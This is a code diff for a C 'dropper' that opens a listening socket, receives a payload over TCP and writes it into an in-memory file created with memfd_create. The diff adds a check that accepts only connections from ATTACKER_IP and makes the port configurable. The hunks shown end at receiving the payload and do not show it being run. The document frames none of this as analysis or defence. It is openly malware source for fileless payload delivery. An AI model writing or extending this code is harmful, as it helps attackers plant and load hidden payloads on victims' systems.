@@ -60,8 +60,6 @@ static int receive(int socket_fd, void *destination, size_t bytes_to_read) {
     return 0;
 }
 
-/* --- socket setup ------------------------------------------------------- */
-
 static int create_listening_socket(uint16_t bind_port, int accept_timeout_seconds,
                                    int *listen_fd_out) {
     int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -110,10 +108,27 @@ static int create_listening_socket(uint16_t bind_port, int accept_timeout_second
     return 0;
 }
 
+/**
+ * @brief Accept one client and make sure its IP is the attackers IP.
+ *
+ * @param listen_fd
+ * @param client_timeout_seconds
+ * @param client_fd_out
+ * @return int
+ */
 static int accept_one_client(int listen_fd, int client_timeout_seconds, int *client_fd_out) {
-    int client_fd = accept(listen_fd, NULL, NULL);
+    struct sockaddr_in addr;
+    socklen_t len = sizeof(addr);
+
+    int client_fd = accept(listen_fd, (struct sockaddr *)&addr, &len);
     if (client_fd < 0)
         return -errno;
+
+    /* Allow connection only from a certain IP address */
+    if (addr.sin_addr.s_addr != inet_addr(ATTACKER_IP)) {
+        close(client_fd);
+        return -EACCES;
+    }
 
     if (client_timeout_seconds > 0) {
         struct timeval client_timeout = {
@@ -132,8 +147,13 @@ static int accept_one_client(int listen_fd, int client_timeout_seconds, int *cli
     return 0;
 }
 
-/* --- payload transfer --------------------------------------------------- */
-
+/**
+ * @brief Receives the 8 byte header of the file to get it's size later.
+ *
+ * @param client_fd
+ * @param file_size_out
+ * @return int
+ */
 static int receive_size_header(int client_fd, uint64_t *file_size_out) {
     uint64_t network_byte_order_size;
 
@@ -144,6 +164,14 @@ static int receive_size_header(int client_fd, uint64_t *file_size_out) {
     return 0;
 }
 
+/**
+ * @brief Create memfd file of `size_in_bytes` size.
+ *
+ * @param name
+ * @param size_in_bytes
+ * @param memory_fd_out
+ * @return int
+ */
 static int create_sized_memory_file(const char *name, uint64_t size_in_bytes, int *memory_fd_out) {
     int memory_fd = memfd_create(name, MFD_ALLOW_SEALING);
     if (memory_fd < 0)
@@ -159,6 +187,14 @@ static int create_sized_memory_file(const char *name, uint64_t size_in_bytes, in
     return 0;
 }
 
+/**
+ * @brief Reads the file payload from socket `client_fd` into `destination_fd`.
+ *
+ * @param client_fd
+ * @param destination_fd
+ * @param total_bytes
+ * @return int
+ */
 static int stream_payload_into_fd(int client_fd, int destination_fd, uint64_t total_bytes) {
     char transfer_buffer[RECEIVE_BUFFER_SIZE];
     uint64_t bytes_remaining = total_bytes;
@@ -215,7 +251,8 @@ int dropper_receive(dropper_context_t *dropper_ctx) {
     int memory_file_fd = -1;
     int res = 0;
 
-    res = create_listening_socket(DROPPER_PORT, DROPPER_ACCEPT_TIMEOUT_SECONDS, &listen_fd);
+    res = create_listening_socket(dropper_ctx->dropper_port, DROPPER_ACCEPT_TIMEOUT_SECONDS,
+                                  &listen_fd);
     if (res < 0)
         goto cleanup;
 
